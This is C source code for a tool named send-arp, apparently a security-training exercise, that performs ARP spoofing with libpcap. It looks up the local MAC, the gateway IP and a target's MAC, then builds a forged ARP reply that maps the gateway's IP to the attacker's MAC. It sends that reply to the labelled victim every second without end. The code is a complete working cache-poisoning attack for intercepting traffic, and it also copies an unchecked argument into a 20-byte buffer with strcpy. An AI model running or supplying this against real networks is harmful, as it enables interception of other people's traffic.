#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>
#include <pcap.h>
#include <unistd.h>
#include <linux/if_ether.h>
#include "InitPcap.h"
#include "GetNetworkInfo.h"

int CheckIP(char* ipStr)
{
    int result = 0;
    char* token = NULL;

    if (strlen(ipStr) <= 15)
    {
        token = strtok(ipStr, ".");
        int i = 0;
        int number = 0;
        for (; token; i++)
        {
            // check string is all number
            number = atoi(token);
            if (number > 255)
            {
                i = 0;
                break;
            }
            token = strtok(NULL, ".");
        }

        if (i == 4)
        {
            result = 1;
        }
    }

    return result;
}

void MakeARPReplyPacket(BYTE* localMac, BYTE* victimMac, BYTE* gatewayIP, BYTE* victimIP, BYTE* arpReplyPacket)
{
    int packetIdx = 0;

    // set ethernet header
    for (int i = 0; i < 6; i++) arpReplyPacket[packetIdx++] = victimMac[i];
    for (int i = 0; i < 6; i++) arpReplyPacket[packetIdx++] = localMac[i];
    arpReplyPacket[packetIdx++] = 0x08; // type : ARP
    arpReplyPacket[packetIdx++] = 0x06;

    // set ARP header
    arpReplyPacket[packetIdx++] = 0x00; // Hardware Type : Ethernet
    arpReplyPacket[packetIdx++] = 0x01;
    arpReplyPacket[packetIdx++] = 0x08; // Protocol Type : IPv4
    arpReplyPacket[packetIdx++] = 0x00;
    arpReplyPacket[packetIdx++] = 0x06; // Hardware Size : 6
    arpReplyPacket[packetIdx++] = 0x04; // Protocol Size : 4
    arpReplyPacket[packetIdx++] = 0x00; // Opcode : Reply
    arpReplyPacket[packetIdx++] = 0x02;
    for (int i = 0; i < 6; i++) arpReplyPacket[packetIdx++] = localMac[i];
    for (int i = 0; i < 4; i++) arpReplyPacket[packetIdx++] = gatewayIP[i];
    for (int i = 0; i < 6; i++) arpReplyPacket[packetIdx++] = victimMac[i];
    for (int i = 0; i < 4; i++) arpReplyPacket[packetIdx++] = victimIP[i];
}

int main(int argc, char** argv)
{
    pcap_t* handle;
    BYTE localMac[6] = {0,};
    BYTE victimMac[6] = {0,};
    BYTE gatewayIP[4];
    BYTE victimIP[4];
    char ipStr[20];
    BYTE arpReplyPacket[42];

    if (argc != 2)
    {
        printf("usage: send-arp <IP>\n");
        return 0;
    }

    strcpy(ipStr, argv[1]);

    if (!ConvertAddrToByteIP(argv[1], victimIP))
    {
        printf("Invalid IP\n");
        return 0;
    }

    if (InitPcap(&handle))
    {
        if (GetLocalMacAddress(localMac))
        {
            printf("[*] local MAC address - %x:%x:%x:%x:%x:%x\n", localMac[0], localMac[1], localMac[2], localMac[3], localMac[4], localMac[5]);
        }
        else
        {
            printf("Get local MAC address fail\n");
        }

        if (GetGatewayIP(gatewayIP))
        {
            printf("[*] gateway IP - %d.%d.%d.%d\n", gatewayIP[0], gatewayIP[1], gatewayIP[2], gatewayIP[3]);
        }
        else
        {
            printf("Get gateway IP fail\n");
        }

        if (GetMacAddress(ipStr, victimMac))
        {
            printf("[*] victim MAC address - %x:%x:%x:%x:%x:%x\n", victimMac[0], victimMac[1], victimMac[2], victimMac[3], victimMac[4], victimMac[5]);
        }
        else
        {
            printf("Get victim MAC address fail : Invalid IP address\n");
        }

        MakeARPReplyPacket(localMac, victimMac, gatewayIP, victimIP, arpReplyPacket);

        printf("[*] sending arp reply packet...\n");

        while (1)
        {
            pcap_sendpacket(handle, arpReplyPacket, sizeof(arpReplyPacket));
            sleep(1);
        }
    }

    

    return 0;
}
